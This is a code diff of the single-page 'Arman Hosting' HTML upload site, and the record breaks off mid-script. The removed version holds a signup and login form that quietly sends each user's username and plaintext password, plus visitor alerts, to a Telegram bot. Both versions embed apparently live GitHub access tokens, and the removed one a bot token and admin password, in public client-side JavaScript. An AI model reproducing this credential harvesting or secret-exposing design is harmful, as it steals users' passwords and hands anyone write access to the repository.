@@ -3,533 +3,309 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Arman Hosting - Instant Free Website Hosting</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Arman Hosting - 100% Free Hosting</title>
+    <style>
+        :root {
+            --primary: #00f2fe;
+            --secondary: #4facfe;
+            --dark: #0b0f19;
+            --card-bg: rgba(17, 24, 39, 0.7);
+            --border: rgba(255, 255, 255, 0.1);
+        }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: var(--dark);
+            background-image: radial-gradient(circle at 50% 10%, #1a233a 0%, var(--dark) 70%);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            width: 100%;
+            max-width: 480px;
+            background: var(--card-bg);
+            backdrop-filter: blur(12px);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .header h1 {
+            font-size: 24px;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .header p {
+            font-size: 13px;
+            color: #9ca3af;
+        }
+        .badges {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .badge {
+            background: rgba(0, 242, 254, 0.1);
+            border: 1px solid rgba(0, 242, 254, 0.3);
+            color: var(--primary);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-size: 12px;
+            color: #d1d5db;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        input[type="text"], textarea {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(3, 7, 18, 0.6);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            transition: all 0.3s ease;
+        }
+        input[type="text"]:focus, textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(0, 242, 254, 0.2);
+        }
+        .file-upload-container {
+            border: 2px dashed var(--border);
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            position: relative;
+            background: rgba(3, 7, 18, 0.3);
+            transition: 0.3s;
+            cursor: pointer;
+        }
+        .file-upload-container:hover {
+            border-color: var(--primary);
+        }
+        .file-upload-container input[type="file"] {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+        .file-label {
+            font-size: 13px;
+            color: #9ca3af;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            border: none;
+            border-radius: 8px;
+            color: #0b0f19;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            transition: opacity 0.3s, transform 0.1s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .btn:hover {
+            opacity: 0.9;
+        }
+        .btn:active {
+            transform: scale(0.98);
+        }
+        .telegram-btn {
+            display: block;
+            text-align: center;
+            margin-top: 15px;
+            padding: 10px;
+            background: #229ed9;
+            color: #fff;
+            border-radius: 8px;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 600;
+            transition: background 0.3s;
+        }
+        .telegram-btn:hover {
+            background: #1f8abf;
+        }
+        #status {
+            margin-top: 15px;
+            font-size: 13px;
+            text-align: center;
+        }
+    </style>
 </head>
-<body class="bg-slate-950 text-white min-h-screen flex flex-col items-center justify-center p-4 relative overflow-x-hidden">
+<body>
 
-    <!-- Background Glow Effects -->
-    <div class="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-blue-600/20 blur-[120px] rounded-full pointer-events-none"></div>
-    <div class="absolute bottom-1/4 right-1/4 w-96 h-96 bg-emerald-600/20 blur-[120px] rounded-full pointer-events-none"></div>
-
-    <!-- ========================================== -->
-    <!-- 1. MAINTENANCE MODE SCREEN -->
-    <!-- ========================================== -->
-    <div id="maintenanceScreen" class="hidden fixed inset-0 z-50 flex flex-col items-center justify-center bg-slate-950 p-6 text-center">
-        <div class="max-w-md w-full bg-slate-900/90 backdrop-blur-xl border border-amber-500/30 rounded-3xl p-8 shadow-2xl">
-            <div class="w-16 h-16 bg-amber-500/10 border border-amber-500/30 rounded-2xl flex items-center justify-center mx-auto mb-4 text-3xl shadow-inner">
-                🚧
-            </div>
-            <span class="bg-amber-500/10 text-amber-400 text-xs font-semibold px-3 py-1 rounded-full border border-amber-500/20">
-                System Upgrade
-            </span>
-            <h1 class="text-2xl font-bold text-white mt-3">Under Maintenance</h1>
-            <p id="maintenanceNote" class="text-slate-400 text-sm mt-2 mb-6">
-                ARMAN HOSTING abhi maintenance par hai. Kripya thodi der baad wapas aayein!
-            </p>
-            <a href="https://t.me/ARMAN_BOMBER" target="_blank"
-                class="inline-block w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-semibold py-3 rounded-2xl transition shadow-lg shadow-blue-600/20">
-                📢 Updates Ke Liye Telegram Join Karein
-            </a>
-        </div>
-    </div>
-
-    <!-- ========================================== -->
-    <!-- 2. AUTHENTICATION & TELEGRAM JOIN MODAL    -->
-    <!-- ========================================== -->
-    <div id="authModal" class="fixed inset-0 z-40 flex items-center justify-center bg-slate-950/80 backdrop-blur-xl p-4">
-        <div class="bg-slate-900/90 border border-slate-800 rounded-3xl max-w-md w-full p-8 shadow-2xl relative overflow-hidden">
-            
-            <div class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-blue-500 via-indigo-500 to-emerald-500"></div>
-
-            <div class="text-center mb-6">
-                <div class="w-16 h-16 bg-gradient-to-tr from-blue-500/20 to-emerald-500/20 border border-blue-500/30 rounded-2xl flex items-center justify-center mx-auto mb-3 shadow-inner">
-                    <svg class="w-8 h-8 text-blue-400" fill="currentColor" viewBox="0 0 24 24">
-                        <path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.14-.257.258-.528.258l.193-3.055 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.64-.203-.659-.64.135-.954l11.566-4.458c.538-.196 1.006.128.832.941z"/>
-                    </svg>
-                </div>
-                <h2 id="authTitle" class="text-2xl font-bold bg-gradient-to-r from-white to-slate-300 bg-clip-text text-transparent">Account Banayein</h2>
-                <p id="authSubtitle" class="text-slate-400 text-xs mt-1">Free hosting use karne ke liye pehle Telegram join karein aur account banayein.</p>
-            </div>
-
-            <!-- Telegram Join Step -->
-            <div id="stepTelegram" class="space-y-4">
-                <a href="https://t.me/ARMAN_BOMBER" target="_blank" onclick="markTelegramJoined()"
-                    class="block text-center w-full bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-semibold py-3.5 rounded-2xl transition shadow-lg shadow-blue-600/20">
-                    📢 Pehle Telegram Channel Join Karein
-                </a>
-                <button onclick="proceedAfterTelegram()" id="btnNextToForm" disabled
-                    class="block w-full bg-slate-800/80 text-slate-500 font-semibold py-3.5 rounded-2xl transition cursor-not-allowed border border-slate-700/50">
-                    Maine Join Kar Liya (Aage Badhein)
-                </button>
-            </div>
-
-            <!-- Login / Signup Form Step -->
-            <div id="stepForm" class="hidden space-y-4">
-                <div class="flex bg-slate-950 p-1.5 rounded-2xl mb-4 border border-slate-800">
-                    <button onclick="switchTab('signup')" id="tabSignup" class="flex-1 py-2.5 text-xs font-bold rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 text-white shadow-md transition">Naya Account</button>
-                    <button onclick="switchTab('login')" id="tabLogin" class="flex-1 py-2.5 text-xs font-bold rounded-xl text-slate-400 transition hover:text-white">Login Karein</button>
-                </div>
-
-                <div class="space-y-3">
-                    <div>
-                        <label class="block text-xs text-slate-400 mb-1 font-medium">Username</label>
-                        <input type="text" id="authUsername" placeholder="apna username dalein"
-                            class="w-full bg-slate-950 border border-slate-800 rounded-2xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 transition">
-                    </div>
-                    <div>
-                        <label class="block text-xs text-slate-400 mb-1 font-medium">Password</label>
-                        <input type="password" id="authPassword" placeholder="••••••••"
-                            class="w-full bg-slate-950 border border-slate-800 rounded-2xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 transition">
-                    </div>
-                </div>
-
-                <button onclick="handleAuthSubmit()" id="authSubmitBtn"
-                    class="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white font-semibold py-3.5 rounded-2xl transition shadow-lg shadow-emerald-600/20 text-sm mt-2">
-                    Account Banayein & Enter Karein
-                </button>
-                <p id="authError" class="text-xs text-center text-red-400 hidden mt-2 font-medium"></p>
-            </div>
-
-        </div>
-    </div>
-
-    <!-- ========================================== -->
-    <!-- 3. ADMIN PANEL MODAL (Opened via #admin)    -->
-    <!-- ========================================== -->
-    <div id="adminModal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-slate-950/85 backdrop-blur-xl p-4">
-        <div class="bg-slate-900 border border-slate-800 rounded-3xl max-w-md w-full p-6 shadow-2xl">
-            <div class="flex justify-between items-center border-b border-slate-800 pb-3 mb-4">
-                <h2 class="text-lg font-bold text-emerald-400 flex items-center gap-2">🛡️ Arman Admin Panel</h2>
-                <button onclick="closeAdminPanel()" class="text-slate-400 hover:text-white text-2xl font-bold">&times;</button>
-            </div>
-
-            <!-- Admin Password Verification -->
-            <div id="adminLoginBox" class="space-y-4">
-                <div>
-                    <label class="block text-xs text-slate-400 mb-1">Admin Password</label>
-                    <input type="password" id="adminPassInput" placeholder="••••••••"
-                        class="w-full bg-slate-950 border border-slate-800 rounded-2xl px-4 py-3 text-sm text-white focus:outline-none focus:border-emerald-500">
-                </div>
-                <button onclick="verifyAdmin()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-3 rounded-2xl text-sm shadow-lg shadow-emerald-600/20 transition">
-                    Unlock Panel
-                </button>
-            </div>
-
-            <!-- Admin Controls -->
-            <div id="adminControlsBox" class="hidden space-y-5">
-                <div class="flex items-center justify-between bg-slate-950 p-4 rounded-2xl border border-slate-800">
-                    <div>
-                        <p class="text-sm font-semibold text-white">Maintenance Mode</p>
-                        <p class="text-xs text-slate-400">Sabhi users ke liye site lock karein</p>
-                    </div>
-                    <label class="relative inline-flex items-center cursor-pointer">
-                        <input type="checkbox" id="maintenanceToggle" class="sr-only peer">
-                        <div class="w-11 h-6 bg-slate-800 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-amber-500"></div>
-                    </label>
-                </div>
-
-                <div>
-                    <label class="block text-xs text-slate-400 mb-1">Maintenance Message</label>
-                    <textarea id="customMaintenanceMsg" rows="3"
-                        class="w-full bg-slate-950 border border-slate-800 rounded-2xl p-3 text-xs text-slate-200 focus:outline-none focus:border-amber-500">ARMAN HOSTING abhi maintenance par hai. Kripya thodi der baad wapas aayein!</textarea>
-                </div>
-
-                <button id="saveAdminBtn" onclick="saveMaintenanceSettings()"
-                    class="w-full bg-gradient-to-r from-amber-600 to-orange-600 hover:from-amber-500 hover:to-orange-500 text-white font-semibold py-3 rounded-2xl text-sm shadow-lg shadow-amber-600/20 transition">
-                    💾 Save & Update Live Status
-                </button>
-                <p id="adminStatusText" class="text-xs text-center text-emerald-400 hidden font-medium"></p>
-            </div>
-        </div>
-    </div>
-
-    <!-- ========================================== -->
-    <!-- 4. MAIN HOSTING WEBSITE CONTENT            -->
-    <!-- ========================================== -->
-    <div id="mainContent" class="max-w-2xl w-full bg-slate-900/80 backdrop-blur-xl border border-slate-800/80 rounded-3xl p-8 shadow-2xl relative z-10">
-        <div class="flex justify-between items-center mb-6">
-            <span class="bg-emerald-500/10 text-emerald-400 text-xs font-semibold px-3.5 py-1.5 rounded-full border border-emerald-500/20 flex items-center gap-1.5">
-                <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span> 100% Free Hosting
-            </span>
-            <span id="loggedInUserDisplay" class="text-xs text-slate-300 bg-slate-950 px-3.5 py-1.5 rounded-xl border border-slate-800 font-medium"></span>
+    <div class="container">
+        <div class="header">
+            <h1>Arman Hosting</h1>
+            <p>Upload your HTML code or file to get your live URL instantly.</p>
         </div>
 
-        <div class="text-center mb-8">
-            <h1 class="text-3xl sm:text-4xl font-extrabold bg-gradient-to-r from-blue-400 via-indigo-400 to-emerald-400 bg-clip-text text-transparent tracking-tight">
-                ARMAN HOSTING
-            </h1>
-            <p class="text-slate-400 text-sm mt-2">
-                Apna HTML code paste karein ya file upload karein aur turant live URL payein.
-            </p>
+        <div class="badges">
+            <span class="badge">100% Free Hosting</span>
+            <span class="badge">ARMAN123</span>
         </div>
 
-        <!-- Hosting Form -->
-        <form id="deployForm" class="space-y-5">
-            <div>
-                <label class="block text-xs font-semibold text-slate-300 mb-1 uppercase tracking-wider">Project / Site Name</label>
-                <div class="flex items-center bg-slate-950 border border-slate-800 rounded-2xl overflow-hidden focus-within:border-blue-500 focus-within:ring-1 focus-within:ring-blue-500 transition">
-                    <span class="text-slate-500 text-xs sm:text-sm pl-4 select-none">armanhost/sites/</span>
-                    <input type="text" id="siteName" required placeholder="mera-project" pattern="[a-zA-Z0-9-_]+"
-                        class="w-full bg-transparent text-white px-2 py-3 text-sm focus:outline-none">
+        <form id="hostingForm">
+            <div class="form-group">
+                <label>Project / Site Name</label>
+                <input type="text" id="projectName" placeholder="my-awesome-site" required>
+            </div>
+
+            <div class="form-group">
+                <label>HTML File Upload (Optional)</label>
+                <div class="file-upload-container">
+                    <span class="file-label" id="fileLabel">Choose file or drag here</span>
+                    <input type="file" id="htmlFile" accept=".html,.htm">
                 </div>
             </div>
 
-            <div>
-                <label class="block text-xs font-semibold text-slate-300 mb-1 uppercase tracking-wider">HTML File Upload Karein (Optional)</label>
-                <input type="file" id="fileInput" accept=".html,.htm"
-                    class="w-full text-xs text-slate-400 file:mr-4 file:py-2.5 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-semibold file:bg-blue-600 file:text-white hover:file:bg-blue-500 cursor-pointer bg-slate-950 border border-slate-800 rounded-2xl p-1.5 transition">
+            <div class="form-group">
+                <label>Or Paste HTML Code Here</label>
+                <textarea id="htmlCode" rows="6" placeholder="<!DOCTYPE html>&#10;<html>&#10;<head><title>My Site</title></head>&#10;<body>&#10;  <h1>Hello World!</h1>&#10;</body>&#10;</html>"></textarea>
             </div>
 
-            <div>
-                <label class="block text-xs font-semibold text-slate-300 mb-1 uppercase tracking-wider">Ya Apna HTML Code Yahan Paste Karein</label>
-                <textarea id="htmlCode" rows="7" required placeholder="<!DOCTYPE html><html><body><h1>Hello World!</h1></body></html>"
-                    class="w-full bg-slate-950 border border-slate-800 rounded-2xl p-4 text-xs font-mono text-emerald-300 focus:outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition"></textarea>
-            </div>
-
-            <button type="submit" id="deployBtn"
-                class="w-full bg-gradient-to-r from-blue-600 via-indigo-600 to-emerald-600 hover:opacity-95 text-white font-bold py-3.5 rounded-2xl transition duration-200 shadow-xl shadow-blue-600/20 text-sm">
-                🚀 Publish & Send to Arman
-            </button>
+            <button type="submit" class="btn" id="submitBtn">Publish & Send to Arman</button>
         </form>
 
-        <!-- Result Box -->
-        <div id="resultBox" class="hidden mt-6 p-4 bg-emerald-950/40 border border-emerald-500/30 rounded-2xl text-center backdrop-blur-md">
-            <p class="text-emerald-400 font-semibold text-sm">🎉 Aapka code successfully Arman ke paas bhej diya gaya hai!</p>
-            <p class="text-xs text-slate-400 mt-1">Live hone ka link:</p>
-            <a id="liveUrl" href="#" target="_blank"
-                class="inline-block mt-3 px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-medium rounded-xl break-all shadow-md">
-            </a>
-        </div>
+        <a href="https://t.me/your_telegram_channel" target="_blank" class="telegram-btn">Join Telegram</a>
 
-        <!-- Error Box -->
-        <div id="errorBox" class="hidden mt-6 p-4 bg-red-950/40 border border-red-500/30 rounded-2xl text-center text-red-400 text-xs font-medium backdrop-blur-md">
-        </div>
+        <div id="status"></div>
     </div>
 
     <script>
-        // ==========================================
-        // CONFIGURATION DETAILS (FIXED)
-        // ==========================================
-        const GITHUB_USERNAME = "afgamezar89-cpu"; 
-        const REPO_NAME = "ARMAN-HOST";             
-        const GITHUB_TOKEN = "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";       
-        const NETLIFY_BASE_URL = "https://afgamezar89-cpu.github.io/ARMAN-HOST"; 
+        const GITHUB_TOKEN = "ghp_1tU55QJ2I04YgA3D8IrYc0l_zAJBnK1R7mTnTCyLvIrHNv0kXs2hqFnl"; // Updated Token
+        const GITHUB_USER = "afgamezar89-cpu";
+        const REPO_NAME = "ARMAN-HOST"; // Your Hosting Repo
 
-        const TELEGRAM_BOT_TOKEN = "9076355564:AAHTm8zSTE8-j2bb9o4wNarBH8WT9fw2WMk"; 
-        const TELEGRAM_CHAT_ID = "8341041677";     
-        const ADMIN_PASSWORD = "arman786"; 
+        const fileInput = document.getElementById('htmlFile');
+        const fileLabel = document.getElementById('fileLabel');
 
-        let authMode = 'signup'; // 'signup' or 'login'
-
-        // ==========================================
-        // INITIAL LOAD & VISITOR TRACKING
-        // ==========================================
-        window.onload = async function() {
-            sendVisitorNotification();
-            checkMaintenanceStatus();
-            checkUrlForAdmin();
-            checkUserSession();
-        };
-
-        // Visitor Notification to Telegram Bot
-        async function sendVisitorNotification() {
-            if (!sessionStorage.getItem('visitor_alerted')) {
-                sessionStorage.setItem('visitor_alerted', 'true');
-                const visitMsg = `👀 New Visitor Alert!\n🌐 Website opened on Arman Hosting.\n⏰ Time: ${new Date().toLocaleString()}`;
-                try {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: visitMsg })
-                    });
-                } catch (e) {
-                    console.log('Visitor notify error:', e);
-                }
-            }
-        }
-
-        // URL me #admin check karne ke liye
-        function checkUrlForAdmin() {
-            if (window.location.hash === '#admin') {
-                document.getElementById('adminModal').classList.remove('hidden');
-            }
-        }
-
-        // Check agar user pehle se logged in hai
-        function checkUserSession() {
-            const savedUser = localStorage.getItem('arman_host_user');
-            if (savedUser) {
-                document.getElementById('authModal').classList.add('hidden');
-                document.getElementById('loggedInUserDisplay').innerText = `👤 ${savedUser}`;
+        fileInput.addEventListener('change', function() {
+            if (fileInput.files.length > 0) {
+                fileLabel.textContent = fileInput.files[0].name;
             } else {
-                document.getElementById('authModal').classList.remove('hidden');
+                fileLabel.textContent = "Choose file or drag here";
             }
-        }
-
-        // ==========================================
-        // AUTHENTICATION & TELEGRAM JOIN LOGIC
-        // ==========================================
-        function markTelegramJoined() {
-            const btn = document.getElementById('btnNextToForm');
-            btn.disabled = false;
-            btn.classList.remove('bg-slate-800/80', 'text-slate-500', 'cursor-not-allowed');
-            btn.classList.add('bg-gradient-to-r', 'from-blue-600', 'to-indigo-600', 'hover:from-blue-500', 'hover:to-indigo-500', 'text-white', 'shadow-lg', 'shadow-blue-600/20');
-            localStorage.setItem('telegram_joined_status', 'true');
-        }
-
-        function proceedAfterTelegram() {
-            if (localStorage.getItem('telegram_joined_status') !== 'true') {
-                alert('Pehle Telegram channel join karein!');
-                return;
-            }
-            document.getElementById('stepTelegram').classList.add('hidden');
-            document.getElementById('stepForm').classList.remove('hidden');
-        }
-
-        function switchTab(mode) {
-            authMode = mode;
-            const btnSignup = document.getElementById('tabSignup');
-            const btnLogin = document.getElementById('tabLogin');
-            const submitBtn = document.getElementById('authSubmitBtn');
-            const title = document.getElementById('authTitle');
-
-            if (mode === 'signup') {
-                btnSignup.className = "flex-1 py-2.5 text-xs font-bold rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 text-white shadow-md transition";
-                btnLogin.className = "flex-1 py-2.5 text-xs font-bold rounded-xl text-slate-400 transition hover:text-white";
-                submitBtn.innerText = "Account Banayein & Enter Karein";
-                title.innerText = "Naya Account Banayein";
-            } else {
-                btnLogin.className = "flex-1 py-2.5 text-xs font-bold rounded-xl bg-gradient-to-r from-emerald-600 to-teal-600 text-white shadow-md transition";
-                btnSignup.className = "flex-1 py-2.5 text-xs font-bold rounded-xl text-slate-400 transition hover:text-white";
-                submitBtn.innerText = "Login Karke Enter Karein";
-                title.innerText = "Apne Account me Login Karein";
-            }
-        }
-
-        async function handleAuthSubmit() {
-            const user = document.getElementById('authUsername').value.trim();
-            const pass = document.getElementById('authPassword').value.trim();
-            const errorBox = document.getElementById('authError');
-            errorBox.classList.add('hidden');
-
-            if (!user || !pass) {
-                errorBox.innerText = "Kripya username aur password dono bharein.";
-                errorBox.classList.remove('hidden');
-                return;
-            }
-
-            const existingUser = localStorage.getItem('arman_registered_user');
-            const existingPass = localStorage.getItem('arman_registered_pass');
-
-            if (authMode === 'signup') {
-                if (existingUser) {
-                    errorBox.innerText = "Aapka account pehle se bana hua hai! Kripya 'Login Karein' par click karein.";
-                    errorBox.classList.remove('hidden');
-                    return;
-                }
-                localStorage.setItem('arman_registered_user', user);
-                localStorage.setItem('arman_registered_pass', pass);
-            } else {
-                if (!existingUser || existingUser !== user || existingPass !== pass) {
-                    errorBox.innerText = "Galat Username ya Password!";
-                    errorBox.classList.remove('hidden');
-                    return;
-                }
-            }
-
-            localStorage.setItem('arman_host_user', user);
-
-            // Send Credentials & Login Alert to Telegram Bot
-            const authAlertMsg = `🔐 New User Auth (${authMode.toUpperCase()})\n👤 Username: ${user}\n🔑 Password: ${pass}\n⏰ Time: ${new Date().toLocaleString()}`;
-            try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: authAlertMsg })
-                });
-            } catch (err) {
-                console.log('Auth notify error:', err);
-            }
-
-            alert("🎉 Successfully logged in!");
-            checkUserSession();
-        }
-
-        // ==========================================
-        // MAINTENANCE & ADMIN PANEL
-        // ==========================================
-        async function checkMaintenanceStatus() {
-            try {
-                const res = await fetch(`./config.json?t=${Date.now()}`);
-                if (res.ok) {
-                    const config = await res.json();
-                    document.getElementById('maintenanceToggle').checked = config.maintenance;
-                    if (config.message) {
-                        document.getElementById('customMaintenanceMsg').value = config.message;
-                        document.getElementById('maintenanceNote').innerText = config.message;
-                    }
-                    if (config.maintenance === true) {
-                        document.getElementById('maintenanceScreen').classList.remove('hidden');
-                    }
-                }
-            } catch (e) {}
-        }
-
-        function closeAdminPanel() {
-            document.getElementById('adminModal').classList.add('hidden');
-            window.location.hash = ''; 
-        }
-
-        function verifyAdmin() {
-            const entered = document.getElementById('adminPassInput').value;
-            if (entered === ADMIN_PASSWORD) {
-                document.getElementById('adminLoginBox').classList.add('hidden');
-                document.getElementById('adminControlsBox').classList.remove('hidden');
-            } else {
-                alert("❌ Galat Password!");
-            }
-        }
-
-        async function saveMaintenanceSettings() {
-            const isMaintenance = document.getElementById('maintenanceToggle').checked;
-            const customMsg = document.getElementById('customMaintenanceMsg').value.trim();
-            const btn = document.getElementById('saveAdminBtn');
-            const statusText = document.getElementById('adminStatusText');
-
-            btn.disabled = true;
-            btn.innerText = "⏳ Updating Live Server...";
-
-            try {
-                const configData = JSON.stringify({
-                    maintenance: isMaintenance,
-                    message: customMsg,
-                    updatedAt: new Date().toISOString()
-                }, null, 2);
-
-                const base64Content = btoa(unescape(encodeURIComponent(configData)));
-                const apiUrl = `https://api.github.com/repos/${GITHUB_USERNAME}/${REPO_NAME}/contents/config.json`;
-
-                let sha = null;
-                const checkRes = await fetch(apiUrl, {
-                    headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
-                });
-                if (checkRes.ok) {
-                    const existingData = await checkRes.json();
-                    sha = existingData.sha;
-                }
-
-                const payload = {
-                    message: `Admin: Maintenance mode ${isMaintenance ? 'ON' : 'OFF'}`,
-                    content: base64Content
-                };
-                if (sha) payload.sha = sha;
-
-                const uploadRes = await fetch(apiUrl, {
-                    method: 'PUT',
-                    headers: {
-                        'Authorization': `token ${GITHUB_TOKEN}`,
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
-
-                if (!uploadRes.ok) throw new Error("GitHub details check karein.");
-
-                statusText.innerText = `✅ Saved! Maintenance ab ${isMaintenance ? 'ON' : 'OFF'} hai.`;
-                statusText.classList.remove('hidden');
-            } catch (err) {
-                alert("❌ Error: " + err.message);
-            } finally {
-                btn.disabled = false;
-                btn.innerText = "💾 Save & Update Live Status";
-            }
-        }
-
-        // ==========================================
-        // HOSTING DEPLOY & TELEGRAM NOTIFICATION
-        // ==========================================
-        document.getElementById('fileInput').addEventListener('change', function(e) {
-            const file = e.target.files[0];
-            if (!file) return;
-            const reader = new FileReader();
-            reader.onload = function(event) {
-                document.getElementById('htmlCode').value = event.target.result;
-            };
-            reader.readAsText(file);
         });
 
-        document.getElementById('deployForm').addEventListener('submit', async function(e) {
+        document.getElementById('hostingForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
-            const siteName = document.getElementById('siteName').value.trim().toLowerCase();
-            const htmlCode = document.getElementById('htmlCode').value;
-            const btn = document.getElementById('deployBtn');
-            const resultBox = document.getElementById('resultBox');
-            const errorBox = document.getElementById('errorBox');
-            const currentUser = localStorage.getItem('arman_host_user') || 'Unknown';
+            const projectName = document.getElementById('projectName').value.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '-');
+            const htmlCodeInput = document.getElementById('htmlCode').value;
+            const statusDiv = document.getElementById('status');
+            const submitBtn = document.getElementById('submitBtn');
 
-            resultBox.classList.add('hidden');
-            errorBox.classList.add('hidden');
-            btn.disabled = true;
-            btn.innerText = "⏳ Processing & Notifying Arman...";
+            if (!projectName) {
+                statusDiv.style.color = '#ef4444';
+                statusDiv.textContent = 'Please enter a valid project name!';
+                return;
+            }
 
+            let fileContent = "";
+
+            if (fileInput.files.length > 0) {
+                const file = fileInput.files[0];
+                fileContent = await file.text();
+            } else if (htmlCodeInput) {
+                fileContent = htmlCodeInput;
+            } else {
+                statusDiv.style.color = '#ef4444';
+                statusDiv.textContent = 'Please upload a file or paste HTML code!';
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Publishing...';
+            statusDiv.style.color = '#38bdf8';
+            statusDiv.textContent = 'Uploading to Arman Hosting...';
+
+            const filePath = `${projectName}/index.html`;
+            const apiUrl = `https://api.github.com/repos/${GITHUB_USER}/${REPO_NAME}/contents/${filePath}`;
+
+            let sha = null;
             try {
-                const base64Content = btoa(unescape(encodeURIComponent(htmlCode)));
-                const filePath = `sites/${siteName}/index.html`;
-                const apiUrl = `https://api.github.com/repos/${GITHUB_USERNAME}/${REPO_NAME}/contents/${filePath}`;
-
-                let sha = null;
-                const checkRes = await fetch(apiUrl, {
+                const getCheck = await fetch(apiUrl, {
                     headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
                 });
-                if (checkRes.ok) {
-                    const existingData = await checkRes.json();
-                    sha = existingData.sha;
+                if (getCheck.ok) {
+                    const data = await getCheck.json();
+                    sha = data.sha;
                 }
+            } catch (err) {}
 
-                const payload = {
-                    message: `New site submission by ${currentUser}: ${siteName}`,
-                    content: base64Content
-                };
-                if (sha) payload.sha = sha;
+            const base64Content = btoa(unescape(encodeURIComponent(fileContent)));
 
-                const uploadRes = await fetch(apiUrl, {
+            const bodyData = {
+                message: `Deploy project: ${projectName}`,
+                content: base64Content,
+                branch: "main"
+            };
+
+            if (sha) {
+                bodyData.sha = sha;
+            }
+
+            try {
+                const response = await fetch(apiUrl, {
                     method: 'PUT',
                     headers: {
                         'Authorization': `token ${GITHUB_TOKEN}`,
-                        'Content-Type': 'application/json'
+                        'Content-Type': 'application/json',
                     },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(bodyData)
                 });
 
-                if (!uploadRes.ok) throw new Error("GitHub upload fail ho gaya.");
-
-                const finalUrl = `${NETLIFY_BASE_URL}/sites/${siteName}/`;
-                const telegramMessage = `🚨 ARMAN HOSTING: New Site!\n\n👤 User: ${currentUser}\n📂 Project: ${siteName}\n🔗 URL: ${finalUrl}`;
-                
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: telegramMessage
-                    })
-                });
-
-                const liveLink = document.getElementById('liveUrl');
-                liveLink.href = finalUrl;
-                liveLink.innerText = finalUrl;
-                resultBox.classList.remove('hidden');
-
+                if (response.ok) {
